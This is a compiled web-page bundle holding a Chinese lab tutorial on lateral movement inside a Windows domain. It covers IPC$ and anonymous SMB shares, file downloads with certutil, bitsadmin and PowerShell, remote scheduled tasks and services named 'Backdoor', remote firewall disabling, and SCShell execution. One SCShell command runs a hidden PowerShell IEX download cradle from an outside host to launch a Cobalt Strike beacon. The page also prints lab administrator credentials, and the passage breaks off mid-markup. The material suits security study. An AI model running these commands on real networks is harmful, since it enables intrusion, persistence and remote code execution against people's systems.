import{_ as e}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as s,a,o as t}from"./app-DS0ZCcmM.js";const n={};function l(r,i){return t(),s("div",null,i[0]||(i[0]=[a(`<h1 id="内网横向" tabindex="-1"><a class="header-anchor" href="#内网横向"><span>内网横向</span></a></h1><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建"><span>环境搭建</span></a></h2><p>攻击机kali:192.168.14.131</p><p>域内机器PC方便测试我添加了两张网卡，一张同通向kali，一张通向域内机器DC，用蚁剑管理，方便横向测试</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>IP1 :192.168.14.110</span></span>
<span class="line"><span>IP2 :192.168.30.20</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>域控主机DC:192.168.30.10</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>域管:</span></span>
<span class="line"><span>Administrator:uu2fu3o@admin</span></span>
<span class="line"><span>域用户:</span></span>
<span class="line"><span>uu2fu3o:!qaz@WSX</span></span>
<span class="line"><span>域:</span></span>
<span class="line"><span>hack.com</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="横向移动中的文件传输" tabindex="-1"><a class="header-anchor" href="#横向移动中的文件传输"><span>横向移动中的文件传输</span></a></h2><h3 id="利用ipc-进行网络共享" tabindex="-1"><a class="header-anchor" href="#利用ipc-进行网络共享"><span>利用IPC$进行网络共享</span></a></h3><p><a href="https://xz.aliyun.com/t/11783" target="_blank" rel="noopener noreferrer">https://xz.aliyun.com/t/11783</a></p><p><code>IPC$(Internet Process Connection)</code>是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，也就是两个进程之间可以利用它产生数据交互，可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用。</p><p>执行net share获取到windows默认开启的网络共享，通过已控主机搭建IPC$服务链接内网主机，能够直接访问内网资源等</p><p><strong>利用条件</strong></p><p>远程主机开启了IPC服务</p><p>远程主机的135和445端口开放</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">net</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> use</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">  \\\\</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">IP/Hostnam</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">e&gt;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\I</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">PC</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">$ &lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">passwor</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">d&gt; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/user:</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">Usernam</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">e&gt;  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#建立连接</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">dir</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> \\\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">IP</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\C</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">$  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#列出目标的C盘</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">copy</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> .</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\r</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">everse_tcp.exe</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> \\\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">IP</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\C</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">$  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#将脚本复制到目标机器的C盘下</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>建立其他共享的命令与ipc相似，可使用账户密码以及ip地址进行连接</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>net use \\\\IP\\C$ &quot;password&quot; /user:&quot;username&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><mark>注意</mark></p><p>IPC$默认大概率会禁用空密码的用户进行连接，并且目前的windows系统在安装的时候都会默认禁用<code>Administrator</code>用户，<em>而是创建一个普通用户并把它加到管理组内</em></p><h3 id="搭建smb服务器" tabindex="-1"><a class="header-anchor" href="#搭建smb服务器"><span>搭建SMB服务器</span></a></h3><p>SMB（Server Message Block）是一种网络协议，用于在计算机之间共享文件、打印机和其他资源。SMB服务器是运行SMB协议的服务器，它提供文件共享和资源访问的功能，使客户端能够通过网络连接到服务器并访问共享的文件和目录。</p><p>攻击者可以通过在自己的服务器上或已控服务器上搭建SMB服务器，并将需要横向的文件添加到指定的UND路径当中(需使用SMB匿名共享)</p><p><strong>linux</strong></p><p>在linux上搭建smb服务器可通过impacket项目提供的smbserver.py来进行</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/PIcGolinux-smbserver.png" alt="linux-smbserver" tabindex="0" loading="lazy"><figcaption>linux-smbserver</figcaption></figure><p>该项目搭建了一个名为testsmb的服务器，并且共享目录设置为/root/share</p><p><strong>windows</strong></p><p>使用命令行开启共享</p><p>1.启用Guest用户</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>net user guest /active:yes</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>2.将Everyone权限应用于匿名用户</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>REG ADD &quot;HKLM\\System\\CurrentControlSet\\Control\\Lsa&quot; /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>3.指定匿名共享文件的位置</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>REG ADD &quot;HKLM\\System\\CurrentControlSet\\Services\\LanManServer\\Parameters&quot; /v NullSessionShares /t REG_MULTI_SZ /d smb /f</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>4.将Guest用户从策略“拒绝从网络访问这台计算机”中移除</p><p>导出组策略：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>secedit /export /cfg gp.inf /quiet</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>修改文件gp.inf，将<code>SeDenyNetworkLogonRight = Guest</code>修改为<code>SeDenyNetworkLogonRight =</code>，保存</p><p>重新导入组策略：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>secedit /configure /db gp.sdb /cfg gp.inf /quiet</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>强制刷新组策略，立即生效(否则，重启后生效)：</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>gpupdate/force</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>5.设置文件共享</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>icacls C:\\share\\ /T /grant Everyone:r</span></span>
<span class="line"><span>net share share=c:\\share /grant:everyone,full</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>至此，可匿名访问的文件共享服务器开启成功，访问的地址为<code>//&lt;ip&gt;/smb</code></p><p>也可以通过脚本一键开启</p><p><a href="https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer" target="_blank" rel="noopener noreferrer">https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer</a></p><div class="language-powershell line-numbers-mode" data-highlighter="shiki" data-ext="powershell" data-title="powershell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Invoke-BuildAnonymousSMBServer</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Path c:\\share </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Mode Enable  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#开启</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">Invoke-BuildAnonymousSMBServer</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> -</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Path c:\\share </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">Mode Disable  </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#关闭</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>问题请参考：</p><p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%BC%80%E5%90%AFWindows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE%E5%85%B1%E4%BA%AB" target="_blank" rel="noopener noreferrer">https://3gstudent.github.io/渗透技巧-通过命令行开启Windows系统的匿名访问共享</a></p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/windows-smbserver.png" alt="windows-smbserver" tabindex="0" loading="lazy"><figcaption>windows-smbserver</figcaption></figure><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/windows-dc-tp-pc-smbserver.png" alt="windows-dc-tp-pc-smbserver" tabindex="0" loading="lazy"><figcaption>windows-dc-tp-pc-smbserver</figcaption></figure><h3 id="利用windows自带的工具" tabindex="-1"><a class="header-anchor" href="#利用windows自带的工具"><span>利用windows自带的工具</span></a></h3><h4 id="certutil" tabindex="-1"><a class="header-anchor" href="#certutil"><span>certutil</span></a></h4><p>windows自带的命令行工具，用于管理证书和部分证书服务的安装，提供了从网络中下载文件的功能</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>certutil -urlcache -split -f http://uu2fu3o.com/test.dtd c:\\test.dtd</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/certutil-pc.png" alt="certutil-pc" tabindex="0" loading="lazy"><figcaption>certutil-pc</figcaption></figure><p>如图，文件成功被下载到指定位置</p><h4 id="bitsadmin" tabindex="-1"><a class="header-anchor" href="#bitsadmin"><span>BITSAdmin</span></a></h4><p>winodows自带的命令行工具(win7及以后的版本)，可完成上传文件，下载等任务</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>bitsadmin /transfer test http://uu2fu3o.com/test.dtd C:\\bitsadmin.txt</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/bitsadmin-pc.png" alt="bitsadmin-pc" tabindex="0" loading="lazy"><figcaption>bitsadmin-pc</figcaption></figure><h4 id="powershell" tabindex="-1"><a class="header-anchor" href="#powershell"><span>Powershell</span></a></h4><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>(New-Object Net.WebClient).DownloadFile(&#39;http://uu2fu3o.com/test.dtd&#39;,&#39;C:\\powershell-download.txt&#39;)</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/powershell-download-pc.png" alt="powershell-download-pc" tabindex="0" loading="lazy"><figcaption>powershell-download-pc</figcaption></figure><p>如图从对应url下载文件</p><h2 id="计划任务横向" tabindex="-1"><a class="header-anchor" href="#计划任务横向"><span>计划任务横向</span></a></h2><h3 id="常规流程" tabindex="-1"><a class="header-anchor" href="#常规流程"><span>常规流程</span></a></h3><p>虽说是计划任务，但还是不免需要用到IPC共享的技术，通过已经建立的IPC连接上传reverse_shell.exe程序，并创建计划任务使其执行</p><p>1.利用已建立的共享上传文件到目标机器</p><p>2.利用IPC连接或使用凭据的方法在远程主机上创建计划任务</p><p>直接演示没有建立IPC连接的方法，利用用户凭据创建计划任务（需要是管理员凭据）</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>schtasks /Create /S 192.168.30.10 /TN Backdoor /SC minute /MO 1 /TR C:\\beacon2.exe /RU System /F /U Administrator /P uu2fu3o@admin</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/plan-mission.png" alt="plan-mission" tabindex="0" loading="lazy"><figcaption>plan-mission</figcaption></figure><p>这里为了实验更加直观，方便，给DC添加了第二张网卡(记得把文件传过去，执行的是本地文件)，执行后即可上线</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/dc-plan-mission.png" alt="dc-plan-mission" tabindex="0" loading="lazy"><figcaption>dc-plan-mission</figcaption></figure><p>执行以下命令，将创建的计划任务删除</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>schtasks /Delete /S 192.168.30.10 /TN Backdoor /F</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/plan-missions-delete.png" alt="plan-missions-delete" tabindex="0" loading="lazy"><figcaption>plan-missions-delete</figcaption></figure><h3 id="unc路径加载执行" tabindex="-1"><a class="header-anchor" href="#unc路径加载执行"><span>UNC路径加载执行</span></a></h3><p>Windows系统中使用UNC路径来访问网络共享资源,大致格式如下</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>\\\\servername\\sharename\\directory\\filename</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>servername:服务器主机名</p><p>sharename:共享服务名</p><p>directory和:filename: 目录和文件名</p><h4 id="what-is-unc" tabindex="-1"><a class="header-anchor" href="#what-is-unc"><span>What is UNC</span></a></h4><p>UNC（Universal Naming Convention）共享路径是一种用于标识和访问网络上共享资源的命名约定。它通常用于在本地计算机或网络上访问共享文件夹、打印机或其他网络资源。</p><h4 id="how-to-use" tabindex="-1"><a class="header-anchor" href="#how-to-use"><span>How to use</span></a></h4><ul><li>在域内一台服务器上搭建SMB匿名服务</li></ul><p>已经在第一节中介绍了如何搭建SMBSERVER，跳过</p><ul><li>使用UNC路径加载目标</li></ul><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>schtasks /Create /S 192.168.30.10 /TN Backdoor /SC minute /MO 1 /TR \\\\192.168.30.20\\smb\\smb-plan-test.exe /RU System  /F /U Administrator /P uu2fu3o@admin</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/smb-test-pan.png" alt="smb-test-pan" tabindex="0" loading="lazy"><figcaption>smb-test-pan</figcaption></figure><p>注意你的smb服务是否已经设定了文件目录，如果有则不需要再设置一次</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/smb-test-plan-2-shell.png" alt="smb-test-plan-2-shell" tabindex="0" loading="lazy"><figcaption>smb-test-plan-2-shell</figcaption></figure><p>一会就能拿到很多会话(实验完记得关闭计划任务或者删除)</p><h2 id="利用系统服务" tabindex="-1"><a class="header-anchor" href="#利用系统服务"><span>利用系统服务</span></a></h2><h3 id="创建远程服务-利用sc进行横向" tabindex="-1"><a class="header-anchor" href="#创建远程服务-利用sc进行横向"><span>创建远程服务，利用SC进行横向</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>net use \\\\192.168.30.10\\IPC$ uu2fu3o@admin /user:Administrator</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/ipc-built-pc_to_dc.png" alt="ipc-built-pc_to_dc" tabindex="0" loading="lazy"><figcaption>ipc-built-pc_to_dc</figcaption></figure><ul><li>利用已经建立的共享服务将恶意文件上传到服务器</li></ul><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/system-server-build.png" alt="system-server-build" tabindex="0" loading="lazy"><figcaption>system-server-build</figcaption></figure><ul><li>利用已建立的IPC共享在远程服务器创建系统服务，执行以下命令</li></ul><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sc</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> \\\\</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">192.168.30.10</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> create</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Backdoor</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> binpath=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;cmd.exe /k C:\\system-server-build.exe&quot;</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#创建一个名为Backdoor的系统服务，为手动执行，binpath后需要有空格</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>执行以下命令启动服务</li></ul><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>sc \\\\192.168.30.10 start Backdoor</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/system-server-build-paild-menu.png" alt="system-server-build-paild-menu" tabindex="0" loading="lazy"><figcaption>system-server-build-paild-menu</figcaption></figure><p>虽然看到这里失败了，但其实我们已经拿到shell了</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/system-server-build-cs-shell.png" alt="system-server-build-cs-shell" tabindex="0" loading="lazy"><figcaption>system-server-build-cs-shell</figcaption></figure><p>通常在渗透流程中，我们运用该项技巧来关闭远程机器的防火墙，如下示例</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>sc \\\\192.168.30.10 create unablefirewall binpath= &quot;netsh advfirewall set allprofiles state off&quot;   </span></span>
<span class="line"><span>sc \\\\192.168.30.10 start unablefirewall</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="无文件横向移动scshell" tabindex="-1"><a class="header-anchor" href="#无文件横向移动scshell"><span>无文件横向移动SCshell</span></a></h3><p>SCShell是无文件横向移动工具，它依赖ChangeServiceConfigA来运行命令。该工具的优点在于它不会针对SMB执行身份验证。一切都通过DCERPC执行。无需创建服务，而只需通过ChangeServiceConfigAAPI 远程打开服务并修改二进制路径名即可（所以要事先知道目标上的服务名称）。支持py和exe两种文件类型。</p><ul><li><p>上传Scshell到已控服务器</p></li><li><p>利用Scshell执行命令横向</p></li></ul><p>大致语法规则如下</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>SCShell.exe target service payload domain username password</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>1.利用Scshell写入文件</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>SCshell.exe 192.168.30.10 Backdoor &quot;C:\\Windows\\System32\\cmd.exe /c systeminfo &gt; \\\\192.168.30.20\\smb\\systeminfo.txt&quot; . Administrator uu2fu3o@admin</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/SCshell-smb-share.png" alt="SCshell-smb-share" tabindex="0" loading="lazy"><figcaption>SCshell-smb-share</figcaption></figure><p>执行systeminfo命令，并将执行内容写入smb共享中 ，但是写入的内容为0kb(很怪)，正常写入的文件大小应该为3kb，经过抓取的流量分析，发现通过SCshell调用的命令仅执行了创建文件的功能，正常写入文件的程序是执行了写入功能的</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/systeminfo-faild.png" alt="systeminfo-faild" tabindex="0" loading="lazy"><figcaption>systeminfo-faild</figcaption></figure><p>失败案例在创建文件之后就down掉了，服务器再次播报。似乎是网络问题导致的tcp再次重新发送失败</p><p>2.利用SCshell上线cs</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>SCshell.exe 192.168.30.10 Backdoor &quot;C:\\Windows\\System32\\cmd.exe /c powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClinet).DownloadString(&#39;http://uu2fu3o.com/payload.ps1&#39;)&quot; hack.com Administrator uu2fu3o@admin</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/Intranet_horizontal/scshell-powershell-cs.png" alt="scshell-powershell-cs" tabindex="0" loading="lazy"><figcaption>scshell-powershell-cs</figcaption></figure><h3 id="uac-remote-restrictions" tabindex="-1"><a class="header-anchor" href="#uac-remote-restrictions"><span>UAC Remote Restrictions</span></a></h3><p>UAC远程限制，当用户以本地用户远程运行需要管理员用户的程序，都只能使用本地用户中RID为500(Adminitrator)的管理员用户来运行</p><p>需要注意的是该限制对域管用户无效，执行以下命令查看本机上用户的SID和RID</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>wmic useraccount where name=&#39;username&#39; get sid</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><figure><img 